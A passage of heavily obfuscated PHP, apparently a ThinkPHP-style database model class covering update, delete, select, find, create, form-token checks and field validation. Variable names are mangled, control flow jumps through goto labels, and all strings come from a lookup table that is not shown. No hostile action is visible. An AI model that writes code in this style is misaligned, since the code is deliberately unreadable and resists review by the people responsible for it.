F¬»Â°¼äô: $Aï®¯Ú° = $this->_parseOptions($Aï®¯Ú°); $Eœœ„áœ = $this->getPk(); if (!isset($Aï®¯Ú°[$dÌ–ß†“ÜŠ[273]])) { if (isset($BõĞ«·ÑØ[$Eœœ„áœ])) { $fö¿µ¥Õß[$Eœœ„áœ] = $BõĞ«·ÑØ[$Eœœ„áœ]; $Aï®¯Ú°[$dÌ–ß†“ÜŠ[273]] = $fö¿µ¥Õß; unset($BõĞ«·ÑØ[$Eœœ„áœ]); } else { $this->error = think_lang($dÌ–ß†“ÜŠ[272]); return !1; } } goto b–®¸Óè‹Ş; Dƒªš×Áğ: $dÌ–ß†“ÜŠ =& $_SERVER[æ§›¦ÌáØ]; if (empty($BõĞ«·ÑØ)) { if (!empty($this->data)) { $BõĞ«·ÑØ = $this->data; $this->data = array(); } else { $this->error = think_lang($dÌ–ß†“ÜŠ[269]); return !1; } } $BõĞ«·ÑØ = $this->_facade($BõĞ«·ÑØ); goto F¬»Â°¼äô; b–®¸Óè‹Ş: if (is_array($Aï®¯Ú°[$dÌ–ß†“ÜŠ[273]]) && isset($Aï®¯Ú°[$dÌ–ß†“ÜŠ[273]][$Eœœ„áœ])) { $d‹Á†°Ş²ô = $Aï®¯Ú°[$dÌ–ß†“ÜŠ[273]][$Eœœ„áœ]; } if (!1 === $this->_beforeUpdate($BõĞ«·ÑØ, $Aï®¯Ú°)) { return !1; } $FæÄÅÍÜŞœ = $this->db->update($BõĞ«·ÑØ, $Aï®¯Ú°); goto d ±Ùé´Õ´; dò›Ô•İ­: } protected function _beforeUpdate(&$fÕÏìÕêÎ, $aÑÍÊ¦©¹) { } protected function _afterUpdate($C«Á¹âãàå, $E¥¤µÒâ‰) { } public function delete($CË‡ø°ƒÅ­ = array()) { goto fï«éÏ¾Î°; b•ƒŠ¨ø: $eƒƒ³Œ¿„ß = $this->db->delete($CË‡ø°ƒÅ­); if (!1 !== $eƒƒ³Œ¿„ß) { $fŠ¼½éèÕ’ = array(); if (isset($E¸™õ¦÷ãÎ)) { $fŠ¼½éèÕ’[$C¹‚œ’Š×Ä] = $E¸™õ¦÷ãÎ; } $this->_after_delete($fŠ¼½éèÕ’, $CË‡ø°ƒÅ­); } return $eƒƒ³Œ¿„ß; goto F·İï‹Ñ“ô; fï«éÏ¾Î°: $eÀŒõœªÒ” =& $_SERVER[æ§›¦ÌáØ]; if (empty($CË‡ø°ƒÅ­) && empty($this->options[$eÀŒõœªÒ”[273]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $C¹‚œ’Š×Ä = $this->getPk(); goto Eã°ñÛ¬ë; Eã°ñÛ¬ë: if (is_numeric($CË‡ø°ƒÅ­) || is_string($CË‡ø°ƒÅ­)) { if (strpos($CË‡ø°ƒÅ­, $eÀŒõœªÒ”[47])) { $a†‚¶–¶äÎ[$C¹‚œ’Š×Ä] = array($eÀŒõœªÒ”[274], $CË‡ø°ƒÅ­); } else { $a†‚¶–¶äÎ[$C¹‚œ’Š×Ä] = $CË‡ø°ƒÅ­; } $this->options[$eÀŒõœªÒ”[273]] = $a†‚¶–¶äÎ; } $CË‡ø°ƒÅ­ = $this->_parseOptions(); if (is_array($CË‡ø°ƒÅ­[$eÀŒõœªÒ”[273]]) && isset($CË‡ø°ƒÅ­[$eÀŒõœªÒ”[273]][$C¹‚œ’Š×Ä])) { $E¸™õ¦÷ãÎ = $CË‡ø°ƒÅ­[$eÀŒõœªÒ”[273]][$C¹‚œ’Š×Ä]; } goto b•ƒŠ¨ø; F·İï‹Ñ“ô: } protected function _after_delete($E¶¶ì“â†œ, $c•Û®ÎØ‚) { } public function select($b¸ø¿¡­õ = array()) { goto AÀÛòø¸±¯; C»£¶ŸäŒì: $this->_afterSelect($E†³ó¬¢Ã, $b¸ø¿¡­õ); return $E†³ó¬¢Ã; goto d¹ÖÛƒÖ‡Í; AÀÛòø¸±¯: $fÔ¦……… =& $_SERVER[æ§›¦ÌáØ]; if (is_string($b¸ø¿¡­õ) || is_numeric($b¸ø¿¡­õ)) { $BòåéÍÑÃ = $this->getPk(); if (strpos($b¸ø¿¡­õ, $fÔ¦………[47])) { $d½ñÚãñ‘Ã[$BòåéÍÑÃ] = array($fÔ¦………[274], $b¸ø¿¡­õ); } else { $d½ñÚãñ‘Ã[$BòåéÍÑÃ] = $b¸ø¿¡­õ; } $this->options[$fÔ¦………[273]] = $d½ñÚãñ‘Ã; } elseif (!1 === $b¸ø¿¡­õ) { $b¸ø¿¡­õ = $this->_parseOptions(); return $fÔ¦………[275] . $this->db->buildSelectSql($b¸ø¿¡­õ) . $fÔ¦………[276]; } $b¸ø¿¡­õ = $this->_parseOptions(); goto a¡µæÄö¨ª; a¡µæÄö¨ª: $E†³ó¬¢Ã = $this->db->select($b¸ø¿¡­õ); if (!1 === $E†³ó¬¢Ã) { return !1; } if (empty($E†³ó¬¢Ã)) { return null; } goto C»£¶ŸäŒì; d¹ÖÛƒÖ‡Í: } protected function _afterSelect(&$fğøĞÖÅÆÖ, $AËì©³¡Ö) { } public function buildSql($b’¢ˆÉ±­Ì = array()) { $BÛèÉ„Áƒâ =& $_SERVER[æ§›¦ÌáØ]; $b’¢ˆÉ±­Ì = $this->_parseOptions($b’¢ˆÉ±­Ì); return $BÛèÉ„Áƒâ[275] . $this->db->buildSelectSql($b’¢ˆÉ±­Ì) . $BÛèÉ„Áƒâ[276]; } public function optionsValue($fÀğ¯ƒó§Ü = null) { if (is_null($fÀğ¯ƒó§Ü)) { return $this->options; } elseif (is_array($fÀğ¯ƒó§Ü)) { $this->options = array_merge($this->options, $fÀğ¯ƒó§Ü); } } protected function _parseOptions($DÀõØµ‰‘ = array()) { goto B§°ì…¯ùÔ; B§°ì…¯ùÔ: $BÎ„ÆãŸ¦¯ =& $_SERVER[æ§›¦ÌáØ]; if (is_array($DÀõØµ‰‘)) { $DÀõØµ‰‘ = array_merge($this->options, $DÀõØµ‰‘); } $this->options = array(); goto c¹Ò–äéè; c¹Ò–äéè: if (!isset($DÀõØµ‰‘[$BÎ„ÆãŸ¦¯[277]])) { $DÀõØµ‰‘[$BÎ„ÆãŸ¦¯[277]] = $this->getTableName(); $dÍÖé¿áÑ = $this->fields; } else { $dÍÖé¿áÑ = $this->getDbFields(); } if (!empty($DÀõØµ‰‘[$BÎ„ÆãŸ¦¯[278]])) { $DÀõØµ‰‘[$BÎ„ÆãŸ¦¯[277]] .= $BÎ„ÆãŸ¦¯[50] . $DÀõØµ‰‘[$BÎ„ÆãŸ¦¯[278]]; } $DÀõØµ‰‘[$BÎ„ÆãŸ¦¯[279]] = $this->name; goto AÚ°ŒÊà–‘; AÚ°ŒÊà–‘: if (isset($DÀõØµ‰‘[$BÎ„ÆãŸ¦¯[273]]) && is_array($DÀõØµ‰‘[$BÎ„ÆãŸ¦¯[273]]) && !empty($dÍÖé¿áÑ) && !isset($DÀõØµ‰‘[$BÎ„ÆãŸ¦¯[280]]) && !isset($DÀõØµ‰‘[$BÎ„ÆãŸ¦¯[277]])) { foreach ($DÀõØµ‰‘[$BÎ„ÆãŸ¦¯[273]] as $f‹›É»¤“¡ => $aÅîˆ˜ÆÔ) { $f‹›É»¤“¡ = trim($f‹›É»¤“¡); if (in_array($f‹›É»¤“¡, $dÍÖé¿áÑ, !0)) { if (is_scalar($aÅîˆ˜ÆÔ)) { $this->_parseType($DÀõØµ‰‘[$BÎ„ÆãŸ¦¯[273]], $f‹›É»¤“¡); } } elseif (!is_numeric($f‹›É»¤“¡) && $BÎ„ÆãŸ¦¯[71] != substr($f‹›É»¤“¡, 0, 1) && !1 === strpos($f‹›É»¤“¡, $BÎ„ÆãŸ¦¯[95]) && !1 === strpos($f‹›É»¤“¡, $BÎ„ÆãŸ¦¯[258]) && !1 === strpos($f‹›É»¤“¡, $BÎ„ÆãŸ¦¯[281]) && !1 === strpos($f‹›É»¤“¡, $BÎ„ÆãŸ¦¯[282])) { unset($DÀõØµ‰‘[$BÎ„ÆãŸ¦¯[273]][$f‹›É»¤“¡]); } } } $this->_options_filter($DÀõØµ‰‘); return $DÀõØµ‰‘; goto DºµØ¼£Òù; DºµØ¼£Òù: } protected function _options_filter(&$D‚”Û­Å“³) { } protected function _parseType(&$BàĞŸÎĞ, $E¬¶èó›ìó) { $fùå‘…› =& $_SERVER[æ§›¦ÌáØ]; if (empty($this->options[$fùå‘…›[283]][$fùå‘…›[4] . $E¬¶èó›ìó])) { $díƒÁğ¾çÊ = strtolower($this->fields[$fùå‘…›[250]][$E¬¶èó›ìó]); if (!1 !== strpos($díƒÁğ¾çÊ, $fùå‘…›[284])) { } elseif (!1 === strpos($díƒÁğ¾çÊ, $fùå‘…›[285]) && !1 !== strpos($díƒÁğ¾çÊ, $fùå‘…›[286])) { $BàĞŸÎĞ[$E¬¶èó›ìó] = intval($BàĞŸÎĞ[$E¬¶èó›ìó]); } elseif (!1 !== strpos($díƒÁğ¾çÊ, $fùå‘…›[287]) || !1 !== strpos($díƒÁğ¾çÊ, $fùå‘…›[288])) { $BàĞŸÎĞ[$E¬¶èó›ìó] = floatval($BàĞŸÎĞ[$E¬¶èó›ìó]); } elseif (!1 !== strpos($díƒÁğ¾çÊ, $fùå‘…›[289])) { $BàĞŸÎĞ[$E¬¶èó›ìó] = (bool) $BàĞŸÎĞ[$E¬¶èó›ìó]; } } } public function find($eÀøÄáÕàÆ = array()) { goto c“ÂÃòƒÍ™; c‰¦ÈçÛ•ß: if (empty($b‘––É¹ê)) { return null; } $this->data = $b‘––É¹ê[0]; $this->_afterFind($this->data, $eÀøÄáÕàÆ); goto cö°ˆ•¸É¯; BˆÕî¿”ïë: $eÀøÄáÕàÆ = $this->_parseOptions(); $b‘––É¹ê = $this->db->select($eÀøÄáÕàÆ); if (!1 === $b‘––É¹ê) { return !1; } goto c‰¦ÈçÛ•ß; c“ÂÃòƒÍ™: $f©ªİìà¡¼ =& $_SERVER[æ§›¦ÌáØ]; if (is_numeric($eÀøÄáÕàÆ) || is_string($eÀøÄáÕàÆ)) { $CåÖ¦˜×ò[$this->getPk()] = intval($eÀøÄáÕàÆ); $this->options[$f©ªİìà¡¼[273]] = $CåÖ¦˜×ò; } $this->options[$f©ªİìà¡¼[290]] = 1; goto BˆÕî¿”ïë; cö°ˆ•¸É¯: if (!empty($this->options[$f©ªİìà¡¼[291]])) { return $this->returnResult($this->data, $this->options[$f©ªİìà¡¼[291]]); } return $this->data; goto Dê«¤¡íˆÁ; Dê«¤¡íˆÁ: } protected function _afterFind(&$eã¶İèìÙõ, $bï¥­Ã‡°–) { } protected function returnResult($C­¸´øÎ•Í, $cÔÏ‡óãİ¼ = '') { $cÚÏƒ‘×˜³ =& $_SERVER[æ§›¦ÌáØ]; if ($cÔÏ‡óãİ¼) { if (is_callable($cÔÏ‡óãİ¼)) { return call_user_func($cÔÏ‡óãİ¼, $C­¸´øÎ•Í); } switch (strtolower($cÔÏ‡óãİ¼)) { case $cÚÏƒ‘×˜³[292]: return json_encode($C­¸´øÎ•Í); case $cÚÏƒ‘×˜³[293]: return xml_encode($C­¸´øÎ•Í); } } return $C­¸´øÎ•Í; } public function parseFieldsMap($B¬…Ñïì¨•, $eìçÚ—Ê‘¾ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $Béš¿„ÒšÃ => $A¤ô«Ïé›) { if ($eìçÚ—Ê‘¾ == 1) { if (isset($B¬…Ñïì¨•[$A¤ô«Ïé›])) { $B¬…Ñïì¨•[$Béš¿„ÒšÃ] = $B¬…Ñïì¨•[$A¤ô«Ïé›]; unset($B¬…Ñïì¨•[$A¤ô«Ïé›]); } } else { if (isset($B¬…Ñïì¨•[$Béš¿„ÒšÃ])) { $B¬…Ñïì¨•[$A¤ô«Ïé›] = $B¬…Ñïì¨•[$Béš¿„ÒšÃ]; unset($B¬…Ñïì¨•[$Béš¿„ÒšÃ]); } } } } return $B¬…Ñïì¨•; } public function setField($bé°Ú‘Ç¬, $f¢”ÎğæŠØ = '') { if (is_array($bé°Ú‘Ç¬)) { $F°°ì¼–öã = $bé°Ú‘Ç¬; } else { $F°°ì¼–öã[$bé°Ú‘Ç¬] = $f¢”ÎğæŠØ; } return $this->save($F°°ì¼–öã); } public function setAdd($aˆ¯†§²’³, $bÖù»Á¸™ = 1) { $f¯Ç¡²¥ˆù =& $_SERVER[æ§›¦ÌáØ]; $bÚÕØïºå© = $aˆ¯†§²’³ . $f¯Ç¡²¥ˆù[294] . $bÖù»Á¸™; if ($bÖù»Á¸™ < 0) { $bÚÕØïºå© = $aˆ¯†§²’³ . $bÖù»Á¸™; } return $this->setField($aˆ¯†§²’³, array($f¯Ç¡²¥ˆù[295], $bÚÕØïºå©)); } public function getField($fö¦ÎÇó‹Ò, $dİ°Í¨ï†Š = null) { $Eæ‚…èËÅ =& $_SERVER[æ§›¦ÌáØ]; $A¦²¨Ò®˜[$Eæ‚…èËÅ[271]] = $fö¦ÎÇó‹Ò; $A¦²¨Ò®˜ = $this->_parseOptions($A¦²¨Ò®˜); $fö¦ÎÇó‹Ò = trim($fö¦ÎÇó‹Ò); if (strpos($fö¦ÎÇó‹Ò, $Eæ‚…èËÅ[47])) { if (!isset($A¦²¨Ò®˜[$Eæ‚…èËÅ[290]])) { $A¦²¨Ò®˜[$Eæ‚…èËÅ[290]] = is_numeric($dİ°Í¨ï†Š) ? $dİ°Í¨ï†Š : $Eæ‚…èËÅ[33]; } $e¥–¹¨½¡– = $this->db->select($A¦²¨Ò®˜); if (!empty($e¥–¹¨½¡–)) { goto Bæ†ÀŠÖÊ; Bæ†ÀŠÖÊ: $A£”½êøÙ« = explode($Eæ‚…èËÅ[47], $fö¦ÎÇó‹Ò); $fö¦ÎÇó‹Ò = array_keys($e¥–¹¨½¡–[0]); $cîìå‰òö = array_shift($fö¦ÎÇó‹Ò); goto c«½Åß¾´¬; c«½Åß¾´¬: $E¼’§òàëÓ = array_shift($fö¦ÎÇó‹Ò); $dİ·„ôÕ¶¥ = array(); $DËÎ“„ù¦é = count($A£”½êøÙ«); goto bÄŒŒƒ²è–; bÄŒŒƒ²è–: foreach ($e¥–¹¨½¡– as $bÉÌÁ¾¬†ê) { $BØàÑÎ¾“ = $bÉÌÁ¾¬†ê[$cîìå‰òö]; if (2 == $DËÎ“„ù¦é) { $dİ·„ôÕ¶¥[$BØàÑÎ¾“] = $bÉÌÁ¾¬†ê[$E¼’§òàëÓ]; } else { $dİ·„ôÕ¶¥[$BØàÑÎ¾“] = is_string($dİ°Í¨ï†Š) ? implode($dİ°Í¨ï†Š, $bÉÌÁ¾¬†ê) : $bÉÌÁ¾¬†ê; } } return $dİ·„ôÕ¶¥; goto B‡ïÅÛî; B‡ïÅÛî: } } else { if (!0 !== $dİ°Í¨ï†Š) { $A¦²¨Ò®˜[$Eæ‚…èËÅ[290]] = is_numeric($dİ°Í¨ï†Š) ? $dİ°Í¨ï†Š : 1; } if ($dİ°Í¨ï†Š === $Eæ‚…èËÅ[253]) { unset($A¦²¨Ò®˜[$Eæ‚…èËÅ[290]]); } $bÉÌÁ¾¬†ê = $this->db->select($A¦²¨Ò®˜); if (!empty($bÉÌÁ¾¬†ê)) { if ($dİ°Í¨ï†Š === $Eæ‚…èËÅ[253]) { return reset($bÉÌÁ¾¬†ê[0]); } if (!0 !== $dİ°Í¨ï†Š && 1 == $A¦²¨Ò®˜[$Eæ‚…èËÅ[290]]) { return reset($bÉÌÁ¾¬†ê[0]); } foreach ($bÉÌÁ¾¬†ê as $AËÚí¶è¾) { $AñªÙ’©Šª[] = $AËÚí¶è¾[$fö¦ÎÇó‹Ò]; } return $AñªÙ’©Šª; } } return null; } public function create($Eòƒğ½ã = '', $c§Í«êˆáª = '') { goto C›­Ç·Â©¦; AÂõñ¿¥³ã: if ($this->autoCheckFields) { $E¢ÂëˆÖØ = $this->getDbFields(); foreach ($Eòƒğ½ã as $d·§Øâ‚™ì => $b¾ï¶ïÒ¦Ü) { if (!in_array($d·§Øâ‚™ì, $E¢ÂëˆÖØ)) { unset($Eòƒğ½ã[$d·§Øâ‚™ì]); } elseif (MAGIC_QUOTES_GPC && is_string($b¾ï¶ïÒ¦Ü)) { $Eòƒğ½ã[$d·§Øâ‚™ì] = stripslashes($b¾ï¶ïÒ¦Ü); } } } $this->autoOperation($Eòƒğ½ã, $c§Í«êˆáª); $this->data = $Eòƒğ½ã; goto BÇÚæ´•‰‹; F’Àå¡ÒÂÒ: if (isset($E¢ÂëˆÖØ)) { if (is_string($E¢ÂëˆÖØ)) { $E¢ÂëˆÖØ = explode($b‡¨°İ‹•[47], $E¢ÂëˆÖØ); } if (think_config($b‡¨°İ‹•[296])) { $E¢ÂëˆÖØ[] = think_config($b‡¨°İ‹•[297]); } foreach ($Eòƒğ½ã as $d·§Øâ‚™ì => $b¾ï¶ïÒ¦Ü) { if (!in_array($d·§Øâ‚™ì, $E¢ÂëˆÖØ)) { unset($Eòƒğ½ã[$d·§Øâ‚™ì]); } } } if (!$this->autoValidation($Eòƒğ½ã, $c§Í«êˆáª)) { return !1; } if (!$this->autoCheckToken($Eòƒğ½ã)) { $this->error = think_lang($b‡¨°İ‹•[298]); return !1; } goto AÂõñ¿¥³ã; A¾‹Äñ·: $Eòƒğ½ã = $this->parseFieldsMap($Eòƒğ½ã, 0); $c§Í«êˆáª = $c§Í«êˆáª ? $c§Í«êˆáª : (!empty($Eòƒğ½ã[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$b‡¨°İ‹•[271]])) { $E¢ÂëˆÖØ = $this->options[$b‡¨°İ‹•[271]]; unset($this->options[$b‡¨°İ‹•[271]]); } elseif ($c§Í«êˆáª == THINK_MODEL_INSERT && isset($this->insertFields)) { $E¢ÂëˆÖØ = $this->insertFields; } elseif ($c§Í«êˆáª == THINK_MODEL_UPDATE && isset($this->updateFields)) { $E¢ÂëˆÖØ = $this->updateFields; } goto F’Àå¡ÒÂÒ; BÇÚæ´•‰‹: return $Eòƒğ½ã; goto a˜« ¢Éí; C›­Ç·Â©¦: $b‡¨°İ‹• =& $_SERVER[æ§›¦ÌáØ]; if (empty($Eòƒğ½ã)) { $Eòƒğ½ã = $_POST; } elseif (is_object($Eòƒğ½ã)) { $Eòƒğ½ã = get_object_vars($Eòƒğ½ã); } if (empty($Eòƒğ½ã) || !is_array($Eòƒğ½ã)) { $this->error = think_lang($b‡¨°İ‹•[269]); return !1; } goto A¾‹Äñ·; a˜« ¢Éí: } public function autoCheckToken($C‹‚Ïçëè) { $eºè‰Ÿ³Â =& $_SERVER[æ§›¦ÌáØ]; if (isset($this->options[$eºè‰Ÿ³Â[299]]) && !$this->options[$eºè‰Ÿ³Â[299]]) { return !0; } if (think_config($eºè‰Ÿ³Â[296])) { $D¼ãÔ”“Å¶ = think_config($eºè‰Ÿ³Â[297]); if (!isset($C‹‚Ïçëè[$D¼ãÔ”“Å¶]) || Session::get($D¼ãÔ”“Å¶)) { return !1; } list($Cëí£ëÓ§à, $EÛ çÏ–äƒ) = explode($eºè‰Ÿ³Â[71], $C‹‚Ïçëè[$D¼ãÔ”“Å¶]); if ($EÛ çÏ–äƒ && Session::get($D¼ãÔ”“Å¶ . $eºè‰Ÿ³Â[95] . $Cëí£ëÓ§à) === $EÛ çÏ–äƒ) { Session::remove($D¼ãÔ”“Å¶ . $eºè‰Ÿ³Â[95] . $Cëí£ëÓ§à); return !0; } if (think_config($eºè‰Ÿ³Â[300])) { Session::remove($D¼ãÔ”“Å¶ . $eºè‰Ÿ³Â[95] . $Cëí£ëÓ§à); } return !1; } return !0; } public function regex($DËÙºà­†‰, $f£×¡ÕôÁÎ) { $B…×Œ»Ò®… =& $_SERVER[æ§›¦ÌáØ]; $b’ïĞÏºß— = array($B…×Œ»Ò®…[301] => $B…×Œ»Ò®…[302], $B…×Œ»Ò®…[303] => $B…×Œ»Ò®…[304], $B…×Œ»Ò®…[305] => $B…×Œ»Ò®…[306], $B…×Œ»Ò®…[307] => $B…×Œ»Ò®…[308], $B…×Œ»Ò®…[309] => $B…×Œ»Ò®…[310], $B…×Œ»Ò®…[311] => $B…×Œ»Ò®…[312], $B…×Œ»Ò®…[313] => $B…×Œ»Ò®…[314], $B…×Œ»Ò®…[288] => $B…×Œ»Ò®…[315], $B…×Œ»Ò®…[316] => $B…×Œ»Ò®…[317]); if (isset($b’ïĞÏºß—[strtolower($f£×¡ÕôÁÎ)])) { $f£×¡ÕôÁÎ = $b’ïĞÏºß—[strtolower($f£×¡ÕôÁÎ)]; } return preg_match($f£×¡ÕôÁÎ, $DËÙºà­†‰) === 1; } private function autoOperation(&$C¤ã•Á¹Àˆ, $D×êÁñ…Üë) { $E¦œ¤£–¢ =& $_SERVER[æ§›¦ÌáØ]; if (!empty($this->options[$E¦œ¤£–¢[318]])) { $c››¯¸â» = $this->options[$E¦œ¤£–¢[318]]; unset($this->options[$E¦œ¤£–¢[318]]); } elseif (!empty($this->_auto)) { $c››¯¸â» = $this->_auto; } if (isset($c››¯¸â»)) { foreach ($c››¯¸â» as $e¤ãƒÁ¢¼‘) { if (empty($e¤ãƒÁ¢¼‘[2])) { $e¤ãƒÁ¢¼‘[2] = THINK_MODEL_INSERT; } if ($D×êÁñ…Üë == $e¤ãƒÁ¢¼‘[2] || $e¤ãƒÁ¢¼‘[2] == THINK_MODEL_BOTH) { switch (trim($e¤ãƒÁ¢¼‘[3])) { case $E¦œ¤£–¢[319]: case $E¦œ¤£–¢[320]: $DêĞ§ÇÆˆÈ = isset($e¤ãƒÁ¢¼‘[4]) ? (array) $e¤ãƒÁ¢¼‘[4] : array(); if (isset($C¤ã•Á¹Àˆ[$e¤ãƒÁ¢¼‘[0]])) { array_unshift($DêĞ§ÇÆˆÈ, $C¤ã•Á¹Àˆ[$e¤ãƒÁ¢¼‘[0]]); } if ($E¦œ¤£–¢[319] == $e¤ãƒÁ¢¼‘[3]) { $C¤ã•Á¹Àˆ[$e¤ãƒÁ¢¼‘[0]] = call_user_func_array($e¤ãƒÁ¢¼‘[1], $DêĞ§ÇÆˆÈ); } else { $C¤ã•Á¹Àˆ[$e¤ãƒÁ¢¼‘[0]] = call_user_func_array(array(&$this, $e¤ãƒÁ¢¼‘[1]), $DêĞ§ÇÆˆÈ); } break; case $E¦œ¤£–¢[271]: $C¤ã•Á¹Àˆ[$e¤ãƒÁ¢¼‘[0]] = $C¤ã•Á¹Àˆ[$e¤ãƒÁ¢¼‘[1]]; break; case $E¦œ¤£–¢[321]: if ($E¦œ¤£–¢[33] === $C¤ã•Á¹Àˆ[$e¤ãƒÁ¢¼‘[0]]) { unset($C¤ã•Á¹Àˆ[$e¤ãƒÁ¢¼‘[0]]); } break; case $E¦œ¤£–¢[322]: default: $C¤ã•Á¹Àˆ[$e¤ãƒÁ¢¼‘[0]] = $e¤ãƒÁ¢¼‘[1]; } if (!1 === $C¤ã•Á¹Àˆ[$e¤ãƒÁ¢¼‘[0]]) { unset($C¤ã•Á¹Àˆ[$e¤ãƒÁ¢¼‘[0]]); } } } } return $C¤ã•Á¹Àˆ; } protected function autoValidation($BÇï¸µ•ˆÖ, $bù©Şä’ê) { $fµ¬›Àòô =& $_SERVER[æ§›¦ÌáØ]; if (!empty($this->options[$fµ¬›Àòô[323]])) { $Aí°‡­Şƒ¯ = $this->options[$fµ¬›Àòô[323]]; unset($this->options[$fµ¬›Àòô[323]]); } elseif (!empty($this->_validate)) { $Aí°‡­Şƒ¯ = $this->_validate; } if (isset($Aí°‡­Şƒ¯)) { if ($this->patchValidate) { $this->error = array(); } foreach ($Aí°‡­Şƒ¯ as $a¤‹Ø¥¤ªŠ => $F“¿Ìé²¯à) { if (empty($F“¿Ìé²¯à[5]) || $F“¿Ìé²¯à[5] == THINK_MODEL_BOTH || $F“¿Ìé²¯à[5] == $bù©Şä’ê) { if (0 == strpos($F“¿Ìé²¯à[2], $fµ¬›Àòô[324]) && strpos($F“¿Ìé²¯à[2], $fµ¬›Àòô[325])) { $F“¿Ìé²¯à[2] = think_lang(substr($F“¿Ìé²¯à[2], 2, -1)); } $F“¿Ìé²¯à[3] = isset($F“¿Ìé²¯à[3]) ? $F“¿Ìé²¯à[3] : THINK_EXISTS_VALIDATE; $F“¿Ìé²¯à[4] = isset($F“¿Ìé²¯à[4]) ? $F“¿Ìé²¯à[4] : $fµ¬›Àòô[326]; switch ($F“¿Ìé²¯à[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($BÇï¸µ•ˆÖ, $F“¿Ìé²¯à)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($fµ¬›Àòô[33] != trim($BÇï¸µ•ˆÖ[$F“¿Ìé²¯à[0]])) { if (!1 === $this->_validationField($BÇï¸µ•ˆÖ, $F“¿Ìé²¯à)) { return !1; } } break; default: if (isset($BÇï¸µ•ˆÖ[$F“¿Ìé²¯à[0]])) { if (!1 === $this->_validationField($BÇï¸µ•ˆÖ, $F“¿Ìé²¯à)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($D²¾‡å¬÷, $D¸×’›ò‹ß) { if (!1 === $this->_validationFieldItem($D²¾‡å¬÷, $D¸×’›ò‹ß)) { if ($this->patchValidate) { $this->error[$D¸×’›ò‹ß[0]] = $D¸×’›ò‹ß[2]; } else { $this->error = $D¸×’›ò‹ß[2]; return !1; } } return; } protected function _validationFieldItem($a„±“‰ÕÛõ, $F·½Ñ‰•õ) { $BˆÅì‰´Ôê =& $_SERVER[æ§›¦ÌáØ]; switch (strtolower(trim($F·½Ñ‰•õ[4]))) { case $BˆÅì‰´Ôê[319]: case $BˆÅì‰´Ôê[320]: $a–ôéºÜÏ  = isset($F·½Ñ‰•õ[6]) ? (array) $F·½Ñ‰•õ[6] : array(); if (is_string($F·½Ñ‰•õ[0]) && strpos($F·½Ñ‰•õ[0], $BˆÅì‰´Ôê[47])) { $F·½Ñ‰•õ[0] = explode($BˆÅì‰´Ôê[47], $F·½Ñ‰•õ[0]); } if (is_array($F·½Ñ‰•õ[0])) { foreach ($F·½Ñ‰•õ[0] as $cÜñ»­™«Ï) { $bˆÅœ¡‚ïö[$cÜñ»­™«Ï] = $a„±“‰ÕÛõ[$cÜñ»­™«Ï]; } array_unshift($a–ôéºÜÏ , $bˆÅœ¡‚ïö); } else { array_unshift($a–ôéºÜÏ , $a„±“‰ÕÛõ[$F·½Ñ‰•õ[0]]); } if ($BˆÅì‰´Ôê[319] == $F·½Ñ‰•õ[4]) { return call_user_func_array($F·½Ñ‰•õ[1], $a–ôéºÜÏ ); } else { return call_user_func_array(array(&$this, $F·½Ñ‰•õ[1]), $a–ôéºÜÏ ); } case $BˆÅì‰´Ôê[327]: return $a„±“‰ÕÛõ[$F·½Ñ‰•õ[0]] == $a„±“‰ÕÛõ[$F·½Ñ‰•õ[1]]; case $BˆÅì‰´Ôê[328]: if (is_string($F·½Ñ‰•õ[0]) && strpos($F·½Ñ‰•õ[0], $BˆÅì‰´Ôê[47])) { $F·½Ñ‰•õ[0] = explode($BˆÅì‰´Ôê[47], $F·½Ñ‰•õ[0]); } $A¬ƒ†’¯˜ = array(); if (is_array($F·½Ñ‰•õ[0])) { foreach ($F·½Ñ‰•õ[0] as $cÜñ»­™«Ï) { $A¬ƒ†’¯˜[$cÜñ»­™«Ï] = $a„±“‰ÕÛõ[$cÜñ»­™«Ï]; } } else { $A¬ƒ†’¯˜[$F·½Ñ‰•õ[0]] = $a„±“‰ÕÛõ[$F·½Ñ‰•õ[0]]; } if (!empty($a„±“‰ÕÛõ[$this->getPk()])) { $A¬ƒ†’¯˜[$this->getPk()] = array($BˆÅì‰´Ôê[329], $a„±“‰ÕÛõ[$this->getPk()]); } if ($this->where($A¬ƒ†’¯˜)->find()) { return !1; } return !0; default: return $this->check($a„±“‰ÕÛõ[$F·½Ñ‰•õ[0]], $F·½Ñ‰•õ[1], $F·½Ñ‰•õ[4]); } } public function check($c‡ŠÆĞŞÂ, $CÙõİŠù­ï, $cáƒ’„ØÙ = "\x72\x65\x67\145\x78") { $D×…³±î¼— =& $_SERVER[æ§›¦ÌáØ]; $cáƒ’„ØÙ = strtolower(trim($cáƒ’„ØÙ)); switch ($cáƒ’„ØÙ) { case $D×…³±î¼—[7]: case $D×…³±î¼—[330]: $FªÍµèê‚ï = is_array($CÙõİŠù­ï) ? $CÙõİŠù­ï : explode($D×…³±î¼—[47], $CÙõİŠù­ï); return $cáƒ’„ØÙ == $D×…³±î¼—[7] ? in_array($c‡ŠÆĞŞÂ, $FªÍµèê‚ï) : !in_array($c‡ŠÆĞŞÂ, $FªÍµèê‚ï); case $D×…³±î¼—[331]: case $D×…³±î¼—[332]: if (is_array($CÙõİŠù­ï)) { $bÆ×„„Ù° = $CÙõİŠù­ï[0]; $AĞ¨æËÌ‚ = $CÙõİŠù­ï[1]; } else { list($bÆ×„„Ù°, $AĞ¨æËÌ‚) = explode($D×…³±î¼—[47], $CÙõİŠù­ï); } return $cáƒ’„ØÙ == $D×…³±î¼—[331] ? $c‡ŠÆĞŞÂ >= $bÆ×„„Ù° && $c‡ŠÆĞŞÂ <= $AĞ¨æËÌ‚ : $c‡ŠÆĞŞÂ < $bÆ×„„Ù° || $c‡ŠÆĞŞÂ > $AĞ¨æËÌ‚; case $D×…³±î¼—[333]: case $D×…³±î¼—[334]: return $cáƒ’„ØÙ == $D×…³±î¼—[333] ? $c‡ŠÆĞŞÂ == $CÙõİŠù­ï : $c‡ŠÆĞŞÂ != $CÙõİŠù­ï; case $D×…³±î¼—[335]: $EˆæßïØ¡§ = mb_strlen($c‡ŠÆĞŞÂ, $D×…³±î¼—[336]); if (strpos($CÙõİŠù­ï, $D×…³±î¼—[47])) { 